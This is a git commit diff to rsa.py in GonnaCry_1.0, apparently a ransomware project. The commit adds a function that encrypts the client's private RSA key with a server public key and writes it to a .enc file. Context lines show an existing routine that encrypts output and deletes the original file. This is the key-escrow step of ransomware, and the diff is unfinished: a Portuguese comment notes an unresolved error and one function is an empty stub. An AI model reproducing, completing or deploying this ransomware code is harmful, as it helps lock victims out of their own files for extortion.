ad2bcdd599183d2b102db81ae1d7376eb7d89915
marinho <tarcisio_marinho09@hotmail.com>
2017-05-23 08:18:53 -0300

    UPDATE_crypt_priv_key_

--- GonnaCry_1.0/rsa.py
+++ GonnaCry_1.0/rsa.py
@@ -18,3 +18,27 @@ def AES_to_RSA():
     f.write(enc)
     f.close()
     os.remove(original)
+
+def RSA_to_SRSA():
+    ### PENSAR COMO CORRIGIR ESSE ERRO ####
+    
+    f=open('keys/CHAVE_PUBLICA_SERVIDOR.txt','rb')
+    chave_publica_servidor=f.read()
+    f.close()
+    chave_publica_servidor_objeto=RSA.importKey(chave_publica_servidor)
+
+    f=open('keys/chave_privada_cliente.txt','rb')
+    conteudo=f.read()
+    f.close()
+
+    f=open('keys/chave_privada_cliente.txt.enc','wb')
+    enc=chave_publica_servidor_objeto.encrypt(conteudo,'x')[0]
+    f.write(enc)
+    f.close()
+    #os.remove('keys/chave_privada_cliente.txt')
+
+
+def SRSA_to_RSA():
+    # RECEBE DO SERVIDOR A CHAVE PRIVADA DO SERVIDOR
+    a=0
+RSA_to_SRSA()
